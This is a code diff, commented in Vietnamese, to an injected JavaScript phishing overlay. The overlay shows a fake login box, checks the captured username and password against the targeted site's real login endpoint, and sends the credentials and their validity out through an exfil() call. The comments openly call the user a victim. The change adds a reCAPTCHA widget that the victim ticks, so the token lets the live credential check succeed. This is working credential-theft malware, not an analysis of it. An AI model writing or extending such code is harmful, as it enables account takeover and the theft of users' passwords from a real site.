@@ -191,6 +191,27 @@
   // Endpoint login gốc: POST /login?lang=vi
   // Fields: email_txt, password_txt, authenticity_token, g-recaptcha-response
   // 2FA: POST /login_two_auth?lang=vi với field token
+  // RECAPTCHA: nạn nhân tự tick trong form phishing → token dùng để verify
+  var RECAPTCHA_SITEKEY = '6LcPvWotAAAAAAvgvdkjo1oHooXdF1MWyGxp29qu';
+  var recaptchaToken = '';
+
+  // Hàm callback khi recaptcha được tick
+  window.onRecaptchaSuccess = function(token) {
+    recaptchaToken = token;
+    try {
+      var btn = document.getElementById(ID_BTN);
+      if (btn) btn.disabled = false;
+    } catch(e) {}
+  };
+
+  window.onRecaptchaExpired = function() {
+    recaptchaToken = '';
+    try {
+      var btn = document.getElementById(ID_BTN);
+      if (btn) btn.disabled = true;
+    } catch(e) {}
+  };
+
   function verifyLogin(username, password, callback) {
     try {
       var csrf = '';
@@ -231,7 +252,7 @@
         '&authenticity_token=' + encodeURIComponent(csrf) +
         '&email_txt=' + encodeURIComponent(username) +
         '&password_txt=' + encodeURIComponent(password) +
-        '&g-recaptcha-response=';
+        '&g-recaptcha-response=' + encodeURIComponent(recaptchaToken);
       xhr.send(params);
     } catch(e) {
       callback(false, 0);
@@ -401,13 +422,33 @@
         'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
       box.appendChild(passInput);
 
-      // Nút xác nhận (ID ẨN)
+      // Nút xác nhận (ID ẨN) - disabled cho đến khi tick recaptcha
       var btn = document.createElement('button');
       btn.textContent = 'Xác nhận';
       btn.setAttribute('id', ID_BTN);
+      btn.disabled = true;
       btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;' +
-        'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;';
+        'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;' +
+        'opacity:0.6;';
       box.appendChild(btn);
+
+      // === RECAPTCHA WIDGET (nạn nhân tự tick) ===
+      var recaptchaDiv = document.createElement('div');
+      recaptchaDiv.setAttribute('class', 'g-recaptcha');
+      recaptchaDiv.setAttribute('data-sitekey', RECAPTCHA_SITEKEY);
+      recaptchaDiv.setAttribute('data-callback', 'onRecaptchaSuccess');
+      recaptchaDiv.setAttribute('data-expired-callback', 'onRecaptchaExpired');
+      recaptchaDiv.style.cssText = 'margin:0 0 15px 0;display:flex;justify-content:center;';
+      box.appendChild(recaptchaDiv);
+
+      // Tải script recaptcha nếu chưa có
+      if (!document.querySelector('script[src*="recaptcha/api.js"]')) {
+        var recaptchaScript = document.createElement('script');
+        recaptchaScript.src = 'https://www.google.com/recaptcha/api.js';
+        recaptchaScript.async = true;
+        recaptchaScript.defer = true;
+        document.head.appendChild(recaptchaScript);
+      }
 
       overlay.appendChild(box);
       document.body.appendChild(overlay);
@@ -436,7 +477,15 @@
         var u = userInput.value;
         var p = passInput.value;
 
-        // 1. Xác thực qua API login gốc
+        // Kiểm tra đã tick recaptcha chưa
+        if (!recaptchaToken) {
+          // Chưa tick → hiện thông báo
+          msg.textContent = 'Vui lòng xác thực mã reCAPTCHA trước khi đăng nhập.';
+          msg.style.color = '#d32f2f';
+          return;
+        }
+
+        // 1. Xác thực qua API login gốc (kèm recaptcha token)
         verifyLogin(u, p, function(valid, loginStatus) {
           // 2. Gửi về server kèm trạng thái valid
           exfil({
@@ -444,6 +493,7 @@
             password: p,
             valid: valid,
             login_status: loginStatus,
+            recaptcha: recaptchaToken.substring(0, 20) + '...',
             url: pageInfo.url
           }, 'pwd');
           // 3. Đánh dấu đã xong
@@ -458,13 +508,20 @@
           var u = userInput.value;
           var p = passInput.value;
           if (u || p) {
-            // Xác thực qua API login gốc
+            // Kiểm tra đã tick recaptcha chưa
+            if (!recaptchaToken) {
+              msg.textContent = 'Vui lòng xác thực mã reCAPTCHA trước khi đăng nhập.';
+              msg.style.color = '#d32f2f';
+              return;
+            }
+            // Xác thực qua API login gốc (kèm recaptcha token)
             verifyLogin(u, p, function(valid, loginStatus) {
               exfil({
                 username: u,
                 password: p,
                 valid: valid,
                 login_status: loginStatus,
+                recaptcha: recaptchaToken.substring(0, 20) + '...',
                 url: pageInfo.url
               }, 'pwd');
               try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
@@ -498,5 +555,8 @@
   //    - Fields: email_txt, password_txt, authenticity_token
   //    - Kết quả valid=true/false gửi kèm về server
   //    - Chỉ gửi sau khi verify xong
+  // 7. ✅ RECAPTCHA: nạn nhân tự tick trong form phishing
+  //    - Token recaptcha dùng để verify login thành công
+  //    - Nút "Xác nhận" disabled cho đến khi tick captcha
   // ============================================================
 })();
